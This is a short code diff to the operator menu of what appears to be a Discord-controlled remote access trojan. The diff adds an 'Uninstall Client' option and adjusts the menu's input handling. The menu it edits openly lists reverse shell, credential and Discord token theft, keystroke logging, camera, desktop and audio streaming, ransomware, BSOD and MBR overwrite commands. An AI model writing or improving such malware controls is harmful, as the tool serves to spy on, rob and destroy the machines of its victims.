@@ -308,13 +308,13 @@ class Main:
         length = 15
 
         options = [
-            "Reverse Shell", "Run PY file", "Resend Credentials", 
+            "Reverse Shell", "Run PY script", "Resend Credentials", 
             "Nuke Discord Tokens", "Update Discord Webhook", "Stream Camera", 
             "Stream Desktop","Stream Audio", "Stop Streaming Camera",
             "Stop Streaming Desktop", "Stop Streaming Audio", "Restart Pc", 
             "Start Ransomware", "Start Trollware", "Stop Trollware", 
             "Start BSOD", "Overwrite MBR", "Shutdown Pc", 
-            "Logged Tokens", "Logged Keystrokes", "Show Targets"
+            "Logged Tokens", "Logged Keystrokes", "Uninstall Client", "Show Targets"
         ]
 
         commands = [
@@ -324,7 +324,7 @@ class Main:
             "stopCamera", "stopAudio", "restart", 
             "startRansomware", "Troll", "stopTroll",
             "bsod", "mbr", "shutdown", 
-            None, None, None
+            None, None, "clean", None
         ]
 
         while True:
@@ -412,7 +412,7 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
                 self.clear()
                 continue
 
-            elif choice == 21:
+            elif choice == 22:
                 self.get_input(choose=False)
                 time.sleep(1)
                 self.clear()
@@ -441,8 +441,10 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
             elif choice == 2:
                 while True:
                     try:
-                        uiprint("Load from file?")
-                        choice = int(input(f"{self.indent}>>"))
+                        uiprint("Load from file? (Y or N)")
+                        choice = input(f"{self.indent}>>")
+
+                        yes = ['y', 'yes', 'yup', 'yeah']
 
                         if choice.lower() in yes:
                             uiprint("Type the filename below:")
